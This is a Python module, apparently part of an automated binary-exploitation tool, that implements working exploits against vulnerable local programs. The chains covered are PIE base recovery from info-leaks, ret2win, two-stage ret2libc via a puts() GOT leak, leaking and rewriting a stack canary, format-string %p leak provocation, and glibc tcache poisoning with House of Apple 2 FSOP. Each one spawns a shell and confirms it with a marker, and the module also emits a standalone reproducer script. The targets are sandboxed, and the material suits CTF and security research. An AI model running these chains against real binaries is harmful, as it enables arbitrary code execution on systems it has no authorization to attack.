"""PIE exploitation via a runtime info-leak (Phase 9 frontier, analyst-in-the-loop).

A PIE binary loads at a randomized base, so static addresses are useless until a runtime
**info-leak** reveals a real address. This drives the target interactively in ONE process
(defeating live ASLR): read the leaked address from its output, compute the load base, send a
payload whose addresses are relocated to that base, and verify the exploit by an observable
success marker. The analyst supplies what the target leaks and how success shows (doc 15).
"""
from __future__ import annotations

import os
import re
import select
import subprocess
import time
from pathlib import Path

from ..dynamic import sandbox


def _kill(p):
    try:
        os.killpg(os.getpgid(p.pid), 9)
    except OSError:
        try:
            p.kill()
        except OSError:
            pass


def leak_and_exploit(exe, base_argv, *, leak_regex: str, leak_base_offset=None,
                     payload_for_base, success_regex: str, timeout: float = 8.0,
                     mem_mb: int = 2048, base_from_leaks=None, leak_trigger: bytes = b"") -> dict:
    """Interactive single-process leak → relocate → exploit over stdin/stdout.

    Two ways to turn the leak into an image base:
      - `leak_base_offset` (analyst-gated): the static offset of the single symbol the target
        leaks, so base = leaked - leak_base_offset.
      - `base_from_leaks` (automatic): a callback given EVERY hex value in the leak burst that
        returns the recovered base (e.g. `exploit.recover_pie_base` bound to the target bytes),
        so the analyst need not say which symbol is leaked.
    `payload_for_base(base)->bytes` builds the relocated payload. Success = `success_regex`
    appears in the post-payload output.
    """
    rx = re.compile(leak_regex.encode("latin-1"))
    ok = re.compile(success_regex.encode("latin-1"))
    preexec = sandbox._rlimits(mem_mb, int(timeout) + 2, set_as=True)
    # The leak harness reads only the target's stdout, so it needs no control channel: contain
    # it fully (read-only fs, tmpfs, private pid + network namespace) when bwrap is available.
    exedir = str(Path(exe).resolve().parent)
    cmd = sandbox.isolate_prefix(exedir, net=False) + \
        [str(exe)] + [str(a) for a in base_argv]
    try:
        p = subprocess.Popen(cmd,
                             stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                             stderr=subprocess.STDOUT, start_new_session=True,
                             preexec_fn=preexec)
    except Exception as e:
        return {"ok": False, "reason": f"spawn failed: {e!r}"}

    if leak_trigger:                             # a format-string leak must be PROVOKED: send the
        try:                                     # %p dump first, then read the pointers it prints
            p.stdin.write(leak_trigger)
            p.stdin.flush()
        except (BrokenPipeError, OSError):
            pass

    def _vals(b):
        out = []
        for m in rx.finditer(b):
            grp = m.group(1) if m.groups() else m.group(0)
            try:
                out.append(int(grp, 16))
            except ValueError:
                pass
        return out

    deadline = time.time() + timeout
    buf = b""
    leaked = None
    last_data = time.time()
    try:
        while time.time() < deadline:
            r, _, _ = select.select([p.stdout], [], [], 0.2)
            if r:
                chunk = os.read(p.stdout.fileno(), 4096)
                if not chunk:
                    break
                buf += chunk
                last_data = time.time()
                if rx.search(buf):
                    leaked = True
                    # a format-string leak prints its whole burst at once, then the target
                    # blocks on our payload read (no EOF, no exit) -- so once something matched,
                    # stop after a brief quiet gap rather than spinning to the deadline.
                    if base_from_leaks is None:
                        break
            elif p.poll() is not None:
                break
            elif leaked and (time.time() - last_data) > 0.3:
                break                                    # burst captured; target now awaits input
        vals = _vals(buf)
        if not vals:
            _kill(p)
            return {"ok": False, "reason": "no leak matched before the target read input",
                    "output": buf[:400].decode("latin-1", "ignore")}

        if base_from_leaks is not None:
            base = base_from_leaks(vals)
            if not base:
                _kill(p)
                return {"ok": False, "reason": "could not recover the image base from the leak",
                        "leaked": vals[:8], "output": buf[:400].decode("latin-1", "ignore")}
        else:
            base = vals[0] - leak_base_offset
        leaked = base + leak_base_offset if base_from_leaks is None else vals[0]
        payload = payload_for_base(base)
        sent_at = len(buf)          # only output AFTER this can confirm the RELOCATED payload worked
        try:
            p.stdin.write(payload)
            p.stdin.flush()
            p.stdin.close()
        except (BrokenPipeError, OSError):
            pass

        out = buf
        # A FRESH budget for the confirmation read: the leak may have arrived just before `deadline`,
        # which would otherwise leave this loop zero iterations and miss a genuine success marker.
        post_deadline = time.time() + timeout
        while time.time() < post_deadline:
            r, _, _ = select.select([p.stdout], [], [], 0.2)
            if r:
                chunk = os.read(p.stdout.fileno(), 4096)
                if not chunk:
                    break
                out += chunk
            elif p.poll() is not None:
                break
        # Search ONLY the post-payload bytes: a success_regex that merely appears in the target's
        # normal startup/leak output (pre-payload) must not declare a false "demonstrated".
        return {"ok": True, "leaked": leaked, "base": base,
                "success": bool(ok.search(out[sent_at:])),
                "output": out[:800].decode("latin-1", "ignore")}
    finally:
        _kill(p)
        try:
            p.wait(timeout=2)
        except Exception:
            pass


def render_ret2win_script(leak_regex, leak_base_offset, off_win, offset) -> bytes:
    """A self-contained, stdlib-only reproducer: leak -> compute base -> ret2win. This is the
    portable PoC for a PIE target (the raw payload is base-specific and cannot be static)."""
    return (
        "#!/usr/bin/env python3\n"
        "# Lykos L3 PIE exploit (leak -> ret2win). Authorized-use only.\n"
        "import re, struct, subprocess, sys\n"
        "EXE = sys.argv[1] if len(sys.argv) > 1 else './poc/target.bin'\n"
        f"LEAK_RE = {leak_regex!r}\n"
        f"LEAK_OFF = {leak_base_offset:#x}   # static offset of the leaked symbol\n"
        f"WIN_OFF  = {off_win:#x}            # static offset of the win function\n"
        f"OFFSET   = {offset}                # overflow offset to saved return address\n"
        "def cyclic(n):\n"
        "    a=b'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'\n"
        "    out=bytearray(); i=0\n"
        "    while len(out)<n:\n"
        "        out+=bytes([a[i%len(a)]]); i+=1\n"
        "    return bytes(out[:n])\n"
        "p=subprocess.Popen([EXE],stdin=subprocess.PIPE,stdout=subprocess.PIPE)\n"
        "leaked=None\n"
        "for line in p.stdout:                       # read whole lines: the address is complete\n"
        "    m=re.search(LEAK_RE.encode(),line)\n"
        "    if m: leaked=int((m.group(1) if m.groups() else m.group(0)),16); break\n"
        "if leaked is None:\n"
        "    sys.stderr.write('no leak captured\\n'); sys.exit(1)\n"
        "base=leaked-LEAK_OFF\n"
        "print('leaked %#x -> base %#x -> win %#x'%(leaked,base,base+WIN_OFF))\n"
        "p.stdin.write(cyclic(OFFSET)+struct.pack('<Q',base+WIN_OFF)+b'C'*8)\n"
        "p.stdin.close()\n"
        "print(p.stdout.read().decode('latin-1','ignore'))\n"
    ).encode()


# --- ret2libc WITH a runtime puts() leak -------------------------------------------------------
def _read_until(p, deadline, quiet=0.3):
    """Read a target's merged stdout until it stalls (a quiet gap) or exits; returns the bytes."""
    out, last = b"", time.time()
    while time.time() < deadline:
        r, _, _ = select.select([p.stdout], [], [], 0.1)
        if r:
            chunk = os.read(p.stdout.fileno(), 4096)
            if not chunk:
                break
            out += chunk
            last = time.time()
        elif p.poll() is not None:
            break
        elif out and (time.time() - last) > quiet:
            break
    return out


def ret2libc_leak(exe, workdir, *, offset, pop_rdi, puts_plt, puts_got, ret_to,
                  puts_off, system_off, binsh_off, ret_gadget=None, base_argv=(),
                  marker: bytes = b"LYKOS_R2L_9931", timeout: float = 8.0,
                  mem_mb: int = 2048) -> dict:
    """Two-stage ret2libc that defeats ASLR with a puts() info-leak, confirmed by a spawned shell.

    Stage 1 (`build_leak_puts`) calls puts(puts@GOT), printing the libc address of puts as raw
    little-endian bytes, then returns to `ret_to` so the loop reads again. `resolve_libc_base`
    subtracts the symbol's offset to recover the libc base; stage 2 (`build_ret2system`) then calls
    system(base+binsh_off) with the resolved system address. `system` needs a 16-byte-aligned rsp,
    and the frame parity of the re-entered stack is environment-dependent (argv/env change it under
    the sandbox), so stage 2's alignment (with/without a `ret` pad) is tried BOTH ways on a fresh
    process each; stage 1's leak is left unpadded, which is the parity that reaches puts on both
    paths -- padding it too would cascade into the return and change stage 2's parity unpredictably.
    Success = the spawned shell echoes `marker` -- an observable a crash or a wrong address can never
    produce. Returns {ok, base, system, leaked, align, ...}.
    """
    from . import rop
    exedir = str(Path(exe).resolve().parent)
    argv = [str(a) for a in base_argv]
    last_leaked = None
    # stage-2 alignment: even parity (no pad), then odd (one `ret`); one of the two is 16-aligned.
    for align in ([None, ret_gadget] if ret_gadget is not None else [None]):
        # A couple of tries per parity: the leak is one process, and a rare short read on stage 1
        # is worth a retry before ruling the parity out.
        for _ in range(3):
            preexec = sandbox._rlimits(mem_mb, int(timeout) + 2, set_as=True)
            cmd = sandbox.isolate_prefix(exedir, net=False, rw_binds=[exedir]) + [str(exe)] + argv
            try:
                p = subprocess.Popen(cmd, stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                                     stderr=subprocess.STDOUT, cwd=exedir,
                                     start_new_session=True, preexec_fn=preexec)
            except Exception as e:                       # noqa: BLE001
                return {"ok": False, "reason": f"spawn failed: {e!r}"}
            try:
                _read_until(p, time.time() + 0.5)        # drain the target's first prompt/banner
                s1 = rop.build_leak_puts(offset, pop_rdi=pop_rdi, got=puts_got, puts_plt=puts_plt,
                                         ret_to=ret_to, ret_gadget=None)   # leak stays unpadded
                try:
                    p.stdin.write(s1)
                    p.stdin.flush()
                except (BrokenPipeError, OSError):
                    continue
                burst = _read_until(p, time.time() + timeout / 2)
                raw = burst.split(b"\n", 1)[0][:6]       # puts prints the 6-byte pointer then \n
                if len(raw) < 6:
                    continue
                leaked = int.from_bytes(raw.ljust(8, b"\x00"), "little")
                base = rop.resolve_libc_base(leaked, puts_off)
                last_leaked = leaked
                if not base:
                    continue                             # not the pointer we assumed; retry/parity
                system, binsh = base + system_off, base + binsh_off
                s2 = rop.build_ret2system(offset, pop_rdi, binsh, system, 0, ret_gadget=align)
                try:
                    p.stdin.write(s2)
                    p.stdin.flush()
                    time.sleep(0.3)
                    p.stdin.write(b"echo " + marker + b"\n")
                    p.stdin.flush()
                except (BrokenPipeError, OSError):
                    break                                # stage 2 killed the process: wrong parity
                # A spawned shell may echo after a gap under the sandbox, so wait out a longer quiet
                # window before concluding the marker never came.
                out = _read_until(p, time.time() + timeout, quiet=1.5)
                if marker in out:
                    return {"ok": True, "base": base, "system": system, "binsh": binsh,
                            "leaked": leaked, "align": align,
                            "output": out[:400].decode("latin-1", "ignore")}
            finally:
                for stream in (p.stdin, p.stdout):       # close first: no buffered flush to a dead
                    try:                                  # pipe raising an unraisable BrokenPipe
                        if stream is not None:
                            stream.close()
                    except Exception:                     # noqa: BLE001
                        pass
                _kill(p)
                try:
                    p.wait(timeout=2)
                except Exception:                        # noqa: BLE001
                    pass
    return {"ok": False, "reason": "no shell confirmed (leak captured but ret2libc did not spawn a "
                                   "shell under either stack alignment)", "leaked": last_leaked}


# --- analyst-assisted PIE ret2libc (pure-libc ROP; no pie_base needed) --------------------------
def analyst_ret2libc(exe, workdir, *, offset, libc_data, leak_offset=None, leak_sym=None,
                     leak_trigger: bytes = b"", leak_regex: str = r"0x[0-9a-fA-F]+",
                     leak_index=None, base_argv=(), marker: bytes = b"LYKOS-PIE-R2L-9931",
                     timeout: float = 8.0, mem_mb: int = 2048) -> dict:
    """PIE/ASLR ret2libc where the ANALYST makes the leak deterministic.

    A PIE target's own gadgets are unusable until pie_base is known, and recovering pie_base (or
    libc_base) generically from a `%p` dump is target/libc-specific (which slot, which symbol, a
    version-specific return offset). Instead the analyst supplies what they identified: a
    `leak_trigger` that discloses a LIBC pointer and either the symbol it points to (`leak_sym`)
    or its raw libc offset (`leak_offset`), so `libc_base = leaked - leak_offset`. The chain is then
    a PURE-LIBC ROP -- `pop rdi; ret` and the `ret` pad come from libc too -- so it never needs
    pie_base. `leak_regex` extracts hex pointers; `leak_index` picks which match (default: the first
    whose subtraction yields a page-aligned base). Success is a spawned shell echoing `marker`.
    """
    import re as _re
    import struct as _struct

    from . import rop
    auto = leak_offset is None and not leak_sym          # no slot named -> auto-classify the dump
    if leak_offset is None and leak_sym:
        leak_offset = rop.libc_symbols(libc_data, (leak_sym,)).get(leak_sym)
        if leak_offset is None:
            return {"ok": False, "reason": f"leak_sym {leak_sym!r} not in libc .dynsym"}
    pop_rdi = rop.find_gadget(libc_data, "pop_rdi")
    ret_g = rop.find_gadget(libc_data, "ret")
    binsh = rop.find_string(libc_data, b"/bin/sh")
    system = rop.libc_symbols(libc_data, ("system",)).get("system")
    if not (pop_rdi and binsh and system):
        return {"ok": False, "reason": "libc lacks a pop-rdi gadget / \"/bin/sh\" / system"}
    rx = _re.compile(leak_regex.encode("latin-1"))
    q = lambda v: _struct.pack("<Q", v & 0xFFFFFFFFFFFFFFFF)      # noqa: E731
    exedir = str(Path(exe).resolve().parent)
    argv = [str(a) for a in base_argv]
    last = None
    for pad in (0, 1):                                            # stage alignment: even, then odd
        for _ in range(3):
            preexec = sandbox._rlimits(mem_mb, int(timeout) + 2, set_as=True)
            cmd = sandbox.isolate_prefix(exedir, net=False, rw_binds=[exedir]) + [str(exe)] + argv
            try:
                p = subprocess.Popen(cmd, stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                                     stderr=subprocess.STDOUT, cwd=exedir,
                                     start_new_session=True, preexec_fn=preexec)
            except Exception as e:                               # noqa: BLE001
                return {"ok": False, "reason": f"spawn failed: {e!r}"}
            try:
                if leak_trigger:
                    try:
                        p.stdin.write(leak_trigger)
                        p.stdin.flush()
                    except (BrokenPipeError, OSError):
                        continue
                burst = _read_until(p, time.time() + timeout / 2)
                vals = []
                for m in rx.finditer(burst):
                    try:
                        vals.append(int(m.group(0), 16))
                    except ValueError:
                        pass
                cands = [vals[leak_index]] if (leak_index is not None and
                                               -len(vals) <= leak_index < len(vals)) else vals
                base = None
                if auto:                                     # no slot named: recover from >=2 syms
                    base = rop.recover_libc_base(cands, libc_data)
                    if base:
                        last = base
                else:
                    for v in cands:
                        b = v - leak_offset
                        if b > 0 and b % 0x1000 == 0:            # a real libc base is page-aligned
                            base, last = b, b
                            break
                if base is None:
                    continue
                chain = bytearray(b"A" * offset)
                if pad:
                    chain += q(base + ret_g)
                chain += q(base + pop_rdi) + q(base + binsh) + q(base + system)
                try:
                    p.stdin.write(bytes(chain))
                    p.stdin.flush()
                    time.sleep(0.3)
                    p.stdin.write(b"echo " + marker + b"\n")
                    p.stdin.flush()
                except (BrokenPipeError, OSError):
                    break                                        # wrong parity: crashed
                out = _read_until(p, time.time() + timeout, quiet=1.5)
                if marker in out:
                    return {"ok": True, "base": base, "system": base + system,
                            "binsh": base + binsh, "pad": pad,
                            "output": out[:400].decode("latin-1", "ignore")}
            finally:
                for s in (p.stdin, p.stdout):
                    try:
                        if s is not None:
                            s.close()
                    except Exception:                            # noqa: BLE001
                        pass
                _kill(p)
                try:
                    p.wait(timeout=2)
                except Exception:                                # noqa: BLE001
                    pass
    return {"ok": False, "reason": "no shell confirmed (leak parsed but the pure-libc chain did not "
                                   "spawn a shell under either alignment)", "base": last}


# --- ret2libc past a STACK CANARY (leak it, write it back, then chain) ---------------------------
def canary_ret2libc(exe, workdir, *, offset, canary_offset, ret_offset, canary_trigger,
                    pop_rdi, puts_plt, puts_got, ret_to, puts_off, system_off, binsh_off,
                    ret_gadget=None, canary_index=None, canary_regex: str = r"0x[0-9a-fA-F]+",
                    loop_feed: bytes = None, base_argv=(), marker: bytes = b"LYKOS-CAN-9931",
                    timeout: float = 8.0, mem_mb: int = 2048) -> dict:
    """ret2libc on a stack-canary-protected no-PIE target. A canary is a per-process random word
    between the buffer and the saved return; overflowing past it trips __stack_chk_fail unless the
    canary is written back UNCHANGED, and its value is random so it has to be LEAKED at runtime.

    `canary_trigger` (a format string / an over-read request) discloses the canary in the SAME
    process; `rop.find_canary` picks it out (or `canary_index` names the leak slot). Every overflow
    then carries `build_canary_prefix` -- pad to the canary, the leaked canary, pad to the return --
    before the ROP. The rest is the two-stage puts leak: stage 1 leaks libc and returns to `ret_to`,
    stage 2 calls system("/bin/sh"). `loop_feed` is what the re-entered loop reads before the second
    overflow (default: the canary trigger again, harmless). Confirmed by a spawned shell.
    """
    import re as _re
    import struct as _struct

    from . import rop
    rx = _re.compile(canary_regex.encode("latin-1"))
    q = lambda v: _struct.pack("<Q", v & 0xFFFFFFFFFFFFFFFF)      # noqa: E731
    feed = canary_trigger if loop_feed is None else loop_feed
    exedir = str(Path(exe).resolve().parent)
    argv = [str(a) for a in base_argv]

    def _canary(p):
        try:
            p.stdin.write(canary_trigger)
            p.stdin.flush()
        except (BrokenPipeError, OSError):
            return None
        dump = _read_until(p, time.time() + timeout / 2)
        vals = [int(m.group(0), 16) for m in rx.finditer(dump)
                if _allint(m.group(0))]
        if canary_index is not None and -len(vals) <= canary_index < len(vals):
            return vals[canary_index]
        return rop.find_canary(vals)

    for align in (None, ret_gadget):
        for _ in range(3):
            preexec = sandbox._rlimits(mem_mb, int(timeout) + 2, set_as=True)
            cmd = sandbox.isolate_prefix(exedir, net=False, rw_binds=[exedir]) + [str(exe)] + argv
            try:
                p = subprocess.Popen(cmd, stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                                     stderr=subprocess.STDOUT, cwd=exedir,
                                     start_new_session=True, preexec_fn=preexec)
            except Exception as e:                               # noqa: BLE001
                return {"ok": False, "reason": f"spawn failed: {e!r}"}
            try:
                _read_until(p, time.time() + 0.5)
                canary = _canary(p)
                if canary is None:
                    continue
                pre = rop.build_canary_prefix(canary_offset, canary, ret_offset)
                # stage 1: leak libc via puts (canary preserved), return to the loop
                s1 = pre + q(pop_rdi) + q(puts_got) + q(puts_plt) + q(ret_to)
                try:
                    p.stdin.write(s1)
                    p.stdin.flush()
                except (BrokenPipeError, OSError):
                    continue
                burst = _read_until(p, time.time() + timeout / 2)
                raw = burst.split(b"\n", 1)[0][:6]
                if len(raw) < 6:
                    continue
                base = rop.resolve_libc_base(int.from_bytes(raw.ljust(8, b"\x00"), "little"), puts_off)
                if not base:
                    continue
                # re-entered loop: satisfy the intermediate read, then stage 2 (system)
                try:
                    p.stdin.write(feed)
                    p.stdin.flush()
                except (BrokenPipeError, OSError):
                    continue
                _read_until(p, time.time() + 0.4)
                s2 = bytearray(pre)
                if align:
                    s2 += q(align)
                s2 += q(pop_rdi) + q(base + binsh_off) + q(base + system_off)
                try:
                    p.stdin.write(bytes(s2))
                    p.stdin.flush()
                    time.sleep(0.3)
                    p.stdin.write(b"echo " + marker + b"\n")
                    p.stdin.flush()
                except (BrokenPipeError, OSError):
                    break                                       # wrong parity
                out = _read_until(p, time.time() + timeout, quiet=1.5)
                if marker in out:
                    return {"ok": True, "canary": canary, "base": base,
                            "system": base + system_off, "align": align,
                            "output": out[:400].decode("latin-1", "ignore")}
            finally:
                for s in (p.stdin, p.stdout):
                    try:
                        if s is not None:
                            s.close()
                    except Exception:                           # noqa: BLE001
                        pass
                _kill(p)
                try:
                    p.wait(timeout=2)
                except Exception:                               # noqa: BLE001
                    pass
    return {"ok": False, "reason": "canary leaked but the ret2libc chain did not spawn a shell "
                                   "(offsets/leak slot?)"}


def _allint(b):
    try:
        int(b, 16)
        return True
    except ValueError:
        return False


# --- automatic leak classification + provocation (gap #2) ---------------------------------------
def classify_leak(vals, target_bytes: bytes, libc_data: bytes = b"") -> dict:
    """Auto-classify a leaked-pointer burst: recover the PIE base (from the binary's own symbols),
    the libc base (from libc's symbols, when a libc is given) and the stack canary, using ONLY the
    leak. Returns {pie_base, libc_base, canary} with None for whatever could not be corroborated.
    This removes the analyst's slot-picking WHEN the dump is rich enough (>=2 corroborating pointers
    for a base; a null-low-byte word for the canary); a sparse dump still yields None and falls back
    to an analyst-supplied slot."""
    from . import rop
    from .exploit import recover_pie_base
    return {
        "pie_base": recover_pie_base(vals, target_bytes),
        "libc_base": rop.recover_libc_base(vals, libc_data) if libc_data else None,
        "canary": rop.find_canary(vals),
    }


def auto_provoke_leak(exe, workdir, target_bytes, libc_data=b"", *, base_argv=(), timeout=6.0,
                      mem_mb=2048, read_cap=64) -> dict:
    """Best-effort automatic leak: drive the target with a format-string `%p` dump (sequential that
    fits `read_cap`, then positional to reach deeper slots) and classify what comes back. Returns
    the classification plus the winning trigger, or empties when nothing was disclosed (the target
    has no format-string sink, or none reachable). Pure provocation -- a target with no printf(user)
    just echoes the specifier as text and classify_leak finds nothing."""
    import re as _re
    hexrx = _re.compile(rb"0x[0-9a-fA-F]+")
    exedir = str(Path(exe).resolve().parent)
    # Sequential dump sized to the read, then a few positional probes for deep code/libc pointers.
    seq = b"%p" + b".%p" * max(1, (read_cap - 4) // 3)
    triggers = [seq[:read_cap] + b"\n"]
    triggers += [(b"|".join(b"%%%d$p" % i for i in range(a, a + 12)) + b"\n")[:read_cap] + b"\n"
                 for a in (7, 19, 31)]
    best = {"pie_base": None, "libc_base": None, "canary": None, "trigger": None, "dump": b""}
    for trig in triggers:
        preexec = sandbox._rlimits(mem_mb, int(timeout) + 2, set_as=True)
        cmd = sandbox.isolate_prefix(exedir, net=False, rw_binds=[exedir]) + \
            [str(exe)] + [str(a) for a in base_argv]
        try:
            p = subprocess.Popen(cmd, stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                                 stderr=subprocess.STDOUT, cwd=exedir, start_new_session=True,
                                 preexec_fn=preexec)
        except Exception:                                    # noqa: BLE001
            continue
        try:
            _read_until(p, time.time() + 0.4)
            try:
                p.stdin.write(trig)
                p.stdin.flush()
            except (BrokenPipeError, OSError):
                continue
            dump = _read_until(p, time.time() + timeout / 2)
        finally:
            for s in (p.stdin, p.stdout):
                try:
                    if s is not None:
                        s.close()
                except Exception:                            # noqa: BLE001
                    pass
            _kill(p)
            try:
                p.wait(timeout=2)
            except Exception:                                # noqa: BLE001
                pass
        vals = [int(m.group(0), 16) for m in hexrx.finditer(dump) if _allint(m.group(0))]
        cls = classify_leak(vals, target_bytes, libc_data)
        # keep the richest result (most fields recovered)
        score = sum(cls[k] is not None for k in ("pie_base", "libc_base", "canary"))
        if score > sum(best[k] is not None for k in ("pie_base", "libc_base", "canary")):
            best = {**cls, "trigger": trig, "dump": dump[:400]}
        if cls["libc_base"] and cls["canary"]:              # enough to finish most chains
            best = {**cls, "trigger": trig, "dump": dump[:400]}
            break
    return best


# --- automated glibc-heap -> shell: tcache poison _IO_2_1_stdout_ + House of Apple 2 (gap #4) ----
def heap_fsop_exploit(exe, workdir, *, add, free, view, edit, exit_seq, libc_data, unsorted_off,
                      poison_size=0x300, guard_size=0x430, marker=b"LYKOS-HEAP-9931",
                      timeout=10.0, base_argv=(), mem_mb=2048) -> dict:
    """Drive a menu-style glibc-heap target to a shell, fully automatically, via tcache poisoning +
    House of Apple 2. Composes the pieces lykos already has (menu model, safe-linking, FSOP):

      1. libc leak  -- free a large chunk (skips tcache -> unsorted bin, its fd points into libc);
         view it; `base = leaked - unsorted_off` (main_arena+0x60 for the target's glibc).
      2. heap leak  -- free a tcache chunk and view its fd == chunk>>12 (safe-linking key; the low
         bits are not needed, mangle only XORs the page).
      3. poison     -- with two freed tcache chunks, edit the head's fd to mangle(chunk, stdout);
         two allocations then hand back a chunk AT `_IO_2_1_stdout_`.
      4. FSOP       -- write build_house_of_apple2 into that chunk, then `exit_seq` flushes the
         corrupted stdout -> system("/bin/sh").

    The four ops are supplied as callables that render the target's own menu input:
    `add(idx,size,data)->bytes`, `free(idx)->bytes`, `view(idx)->bytes`, `edit(idx,data)->bytes`;
    `exit_seq` triggers a flush. Confirmed by a spawned shell echoing `marker`. Returns
    {ok, libc_base, heap_page, ...}."""
    import struct as _struct

    from . import heap as _heap
    from . import rop
    T = _heap.house_of_apple2_targets(libc_data)
    if not T:
        return {"ok": False, "reason": "libc lacks _IO_2_1_stdout_/_IO_wfile_jumps/system"}
    exedir = str(Path(exe).resolve().parent)
    preexec = sandbox._rlimits(mem_mb, int(timeout) + 4, set_as=True)
    cmd = sandbox.isolate_prefix(exedir, net=False, rw_binds=[exedir]) + \
        [str(exe)] + [str(a) for a in base_argv]
    try:
        p = subprocess.Popen(cmd, stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                             stderr=subprocess.STDOUT, cwd=exedir, start_new_session=True,
                             preexec_fn=preexec)
    except Exception as e:                               # noqa: BLE001
        return {"ok": False, "reason": f"spawn failed: {e!r}"}

    def _op(seq, read_secs=0.35):
        try:
            p.stdin.write(seq)
            p.stdin.flush()
        except (BrokenPipeError, OSError):
            return b""
        return _read_until(p, time.time() + read_secs, quiet=0.2)

    def _ptr(out):
        return _struct.unpack("<Q", out[:8].ljust(8, b"\x00")[:8])[0] if out else 0
    try:
        _read_until(p, time.time() + 0.5)
        # 1) libc leak via the unsorted bin
        _op(add(0, guard_size, b"A"))
        _op(add(1, guard_size, b"B"))               # guard: stops back-consolidation with the top
        _op(free(0))
        libc_leak = _ptr(_op(view(0), 0.5))
        base = rop.resolve_libc_base(libc_leak, unsorted_off)
        if not base:
            return {"ok": False, "reason": f"libc leak failed (got {hex(libc_leak)})"}
        stdout_addr = base + T["stdout"]
        # 2) heap leak via a freed tcache chunk's safe-linked fd
        _op(add(2, poison_size, b"C"))
        _op(add(3, poison_size, b"D"))
        _op(free(2))
        heap_page = _ptr(_op(view(2), 0.5))          # == chunk2 >> 12
        if not heap_page:
            return {"ok": False, "reason": "heap leak failed"}
        _op(add(2, poison_size, b"C"))               # take chunk2 back; tcache empty for this size
        # 3) poison: free two, mangle the head's fd to _IO_2_1_stdout_
        _op(free(3))
        _op(free(2))
        _op(edit(2, _struct.pack("<Q", heap_page ^ stdout_addr) + b"\x00" * 8))
        _op(add(4, poison_size, b"E"))               # returns chunk2
        # 4) the next allocation lands on _IO_2_1_stdout_; write the House of Apple 2 FILE there
        blob = _heap.build_house_of_apple2(stdout_addr, wfile_jumps=base + T["wfile_jumps"],
                                           system=base + T["system"])
        _op(add(5, poison_size, blob[:poison_size]))
        # trigger the flush -> FSOP -> shell, then confirm
        try:
            p.stdin.write(exit_seq)
            p.stdin.flush()
            time.sleep(0.3)
            p.stdin.write(b"echo " + marker + b"\n")
            p.stdin.flush()
        except (BrokenPipeError, OSError):
            return {"ok": False, "reason": "crashed before the shell", "libc_base": base}
        out = _read_until(p, time.time() + timeout, quiet=1.5)
        if marker in out:
            return {"ok": True, "libc_base": base, "heap_page": heap_page,
                    "stdout": stdout_addr, "output": out[:400].decode("latin-1", "ignore")}
        return {"ok": False, "reason": "no shell confirmed", "libc_base": base,
                "output": out[:200].decode("latin-1", "ignore")}
    finally:
        for s in (p.stdin, p.stdout):
            try:
                if s is not None:
                    s.close()
            except Exception:                           # noqa: BLE001
                pass
        _kill(p)
        try:
            p.wait(timeout=2)
        except Exception:                               # noqa: BLE001
            pass
